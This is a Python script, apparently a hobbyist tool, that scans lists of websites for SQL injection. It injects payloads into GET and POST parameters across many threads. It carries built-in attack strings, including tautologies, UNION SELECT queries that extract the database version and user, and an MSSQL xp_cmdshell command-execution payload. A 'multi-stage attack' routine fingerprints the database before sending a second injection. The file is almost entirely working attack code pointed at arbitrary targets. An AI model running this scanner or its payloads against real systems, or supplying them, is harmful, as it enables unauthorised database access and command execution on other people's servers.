import requests
import argparse
import logging
import time
from urllib.parse import urlparse, parse_qs, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
from termcolor import colored
import threading
import os



def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')


clear_terminal()

ascii_art = """
   ▄█    █▄       ▄████████  ▄█     █▄      ███             ▄████████ ████████▄    ▄█       
  ███    ███     ███    ███ ███     ███ ▀█████████▄        ███    ███ ███    ███  ███       
  ███    ███     ███    ███ ███     ███    ▀███▀▀██        ███    █▀  ███    ███  ███       
 ▄███▄▄▄▄███▄▄   ███    ███ ███     ███     ███   ▀        ███        ███    ███  ███       
▀▀███▀▀▀▀███▀  ▀███████████ ███     ███     ███          ▀███████████ ███    ███  ███       
  ███    ███     ███    ███ ███     ███     ███                   ███ ███    ███  ███       
  ███    ███     ███    ███ ███ ▄█▄ ███     ███             ▄█    ███ ███  ▀ ███  ███▌    ▄ 
  ███    █▀      ███    █▀   ▀███▀███▀     ▄████▀         ▄████████▀   ▀██████▀▄█ █████▄▄██ 
                                                                                  ▀         

Created by @h.awtsauce
"""

print(colored(ascii_art, 'blue'))


logging.basicConfig(filename='sql_injection_test.log', level=logging.DEBUG, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

lock = threading.Lock()
stop_scan = threading.Event()

def detect_db_type(response_text):
    if "MySQL" in response_text:
        return "mysql"
    elif "SQL Server" in response_text or "MSSQL" in response_text:
        return "mssql"
    elif "PostgreSQL" in response_text:
        return "postgresql"
    elif "Oracle" in response_text:
        return "oracle"
    return None

def load_payloads(file_path, db_type):
    with open(file_path, 'r') as file:
        payloads = [line.strip() for line in file]
    if db_type == "mysql":
        payloads.extend(["' OR '1'='1", "' UNION SELECT null, version() --"])
    elif db_type == "mssql":
        payloads.extend(["' OR '1'='1", "'; EXEC xp_cmdshell('whoami') --"])
    elif db_type == "postgresql":
        payloads.extend(["' OR '1'='1", "' UNION SELECT version() --"])
    elif db_type == "oracle":
        payloads.extend(["' OR '1'='1", "' UNION SELECT banner FROM v$version --"])
    return payloads

def load_urls(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file if '=' in line]

def analyze_response(response):
    if response.status_code == 200 and len(response.text) < 100:
        return "Potential Blind SQL Injection"
    elif response.status_code == 500:
        return "Internal Server Error - Possible SQL Injection"
    return None

def safe_request(url, method="GET", data=None, retries=3, timeout=20):
    for attempt in range(retries):
        try:
            if method.upper() == "GET":
                response = requests.get(url, timeout=timeout)
            elif method.upper() == "POST":
                response = requests.post(url, data=data, timeout=timeout)
            logging.debug(f"Response received with status code: {response.status_code}")
            return response
        except requests.exceptions.RequestException as e:
            logging.error(f"Request failed for URL: {url} with error: {e}")
            if attempt == retries - 1:
                raise e
            time.sleep(2)  

def dynamic_payload_generation(base_payload, target_info):
    return base_payload.replace("{db_version}", target_info.get('db_version', 'unknown'))

def generate_payloads(base_payload, variations):
    payloads = []
    for variation in variations:
        payloads.append(base_payload.replace("{var}", variation))
    return payloads

def multi_stage_attack(url, session, db_type, payloads):
    version_payload = "' UNION SELECT null, version() --" if db_type == "mysql" else payloads[0]
    response = session.get(url.replace("=", f"={version_payload}"))
    detected_db_type = detect_db_type(response.text)

    if detected_db_type:
        print(f"[+] Database type detected: {detected_db_type}")
        second_stage_payload = "' UNION SELECT null, user() --" if detected_db_type == "mysql" else payloads[1]
        response = session.get(url.replace("=", f"={second_stage_payload}"))
        if response.status_code == 200:
            print(f"[+] Multi-stage attack succeeded: {url}")
            return True
    return False

def is_vulnerable(url, payloads, method="GET", data=None, max_payloads=10):
    if stop_scan.is_set():
        return False  
    
    session = requests.Session()
    for count, payload in enumerate(payloads):
        if count >= max_payloads:
            print(colored(f"[!] Payload limit reached for URL: {url}. Skipping to next URL.", 'yellow'))
            return False

        print(colored(f"-------------------------------------", 'cyan'))
        print(colored(f"[+] TEST URL : {url}", 'red'))
        print(colored(f"[+] PAYLOAD : {payload}", 'red'))
        print(colored(f"-------------------------------------", 'cyan'))

        if method.upper() == "GET":
            injected_url = url.replace("=", f"={payload}")
            try:
                response = safe_request(injected_url, method, data)
                if response and ("SQL syntax" in response.text or "mysql_fetch_array()" in response.text):
                    vuln_type = analyze_response(response)
                    logging.info(f"{vuln_type} found: {injected_url}")
                    print(colored(f"-------------------------------------", 'cyan'))
                    print(colored(f"[+] FOUND SQL! : {injected_url}", 'green'))
                    print(colored(f"[+] PAYLOAD : {payload}", 'green'))
                    print(colored(f"-------------------------------------", 'cyan'))
                    with lock:
                        if not check_continue():
                            stop_scan.set()  
                            return True
                    break
                multi_stage_attack(injected_url, session, detect_db_type(response.text), payloads)
            except requests.exceptions.RequestException as e:
                logging.error(f"Error with URL {injected_url}: {e}")
                print(f"[!] Error with URL {injected_url}: {e}")
        elif method.upper() == "POST":
            try:
                post_data = {k: v.replace("=", f"={payload}") for k, v in data.items()}
                response = safe_request(url, method, post_data)
                if response and ("SQL syntax" in response.text or "mysql_fetch_array()" in response.text):
                    vuln_type = analyze_response(response)
                    logging.info(f"{vuln_type} found: {url} with POST data: {post_data}")
                    print(colored(f"-------------------------------------", 'cyan'))
                    print(colored(f"[+] FOUND SQL! : {url}", 'green'))
                    print(colored(f"[+] PAYLOAD : {payload}", 'green'))
                    print(colored(f"-------------------------------------", 'cyan'))
                    with lock:
                        if not check_continue():
                            stop_scan.set()  
                            return True
                    break
                multi_stage_attack(url, session, detect_db_type(response.text), payloads)
            except requests.exceptions.RequestException as e:
                logging.error(f"Error with URL {url}: {e}")
                print(f"[!] Error with URL {url}: {e}")
    return False

def test_all_params(url, payloads, method="GET", data=None, max_payloads=10):
    if stop_scan.is_set():
        return None  
    
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?"

    for param in query_params:
        for count, payload in enumerate(payloads):
            if count >= max_payloads:
                print(colored(f"[!] Payload limit reached for URL: {url}. Skipping to next URL.", 'yellow'))
                return None

            params_copy = query_params.copy()
            params_copy[param] = payload
            test_url = base_url + urlencode(params_copy, doseq=True)
            if is_vulnerable(test_url, payloads, method, data, max_payloads):
                return test_url
    return None

def summary_report(vulnerable_urls):
    print("\n--- SQL Injection Test Summary ---")
    print(f"Total URLs tested: {len(urls)}")
    print(f"Vulnerabilities found: {len(vulnerable_urls)}")
    if vulnerable_urls:
        print("Vulnerable URLs:")
        for url in vulnerable_urls:
            print(f"- {url}")

def test_url(url, payloads, method="GET", data=None, max_payloads=10):
    if stop_scan.is_set():
        return None  
    
    print(f"[*] Testing {url}...")
    result = test_all_params(url, payloads, method, data, max_payloads)
    return result

def check_continue():
    while True:
        user_input = input(colored("SQL Vulnerability Found, Continue? (y/n): ", 'cyan')).strip().lower()
        if user_input in ['y', 'n']:
            return user_input == 'y'
        else:
            print(colored("Invalid input. Please enter 'y' or 'n'.", 'yellow'))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SQL Injection vulnerability scanner.")
    parser.add_argument("-u", "--url", help="URL to test (must contain a parameter).", required=False)
    parser.add_argument("-f", "--file", help="File containing a list of URLs to test.", required=False)
    parser.add_argument("-l", "--payloads", help="File containing SQL injection payloads.", required=True)
    parser.add_argument("--db", help="Database type (e.g., mysql, mssql, postgresql, oracle).", required=False, default="mysql")
    parser.add_argument("--data", help="POST data to test (e.g., 'param1=value1&param2=value2').", required=False)
    parser.add_argument("--method", help="HTTP method to use (GET or POST).", required=False, default="GET")
    parser.add_argument("--threads", help="Number of threads to use for scanning.", required=False, type=int, default=10)
    parser.add_argument("--max-payloads", help="Maximum number of payloads to test per URL.", required=False, type=int, default=10)

    args = parser.parse_args()

    if not args.url and not args.file:
        parser.error("You must specify either a URL (-u) or a file with URLs (-f).")

    if args.url and '=' not in args.url:
        parser.error("The specified URL must contain a parameter (e.g., 'http://example.com/page?id=1').")

    payloads = load_payloads(args.payloads, args.db)

    urls = []
    if args.url:
        urls.append(args.url)
    if args.file:
        urls.extend(load_urls(args.file))

    post_data = None
    if args.data:
        post_data = dict(param.split('=') for param in args.data.split('&'))

    base_payload = "' OR '1'='1 {var} --"
    variations = ["AND 1=1", "AND 1=2", "UNION SELECT", "SLEEP(5)"]
    generated_payloads = generate_payloads(base_payload, variations)
    payloads.extend(generated_payloads)

    print(f"[*] Starting SQL Injection test with {args.threads} threads...")

    vulnerable_urls = []
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = [executor.submit(test_url, url, payloads, args.method, post_data, args.max_payloads) for url in urls]
        for future in as_completed(futures):
            result = future.result()
            if result:
                vulnerable_urls.append(result)
            if stop_scan.is_set():
                break 

    summary_report(vulnerable_urls)
    print(colored("\n[*] SQL Injection test completed.", 'yellow'))
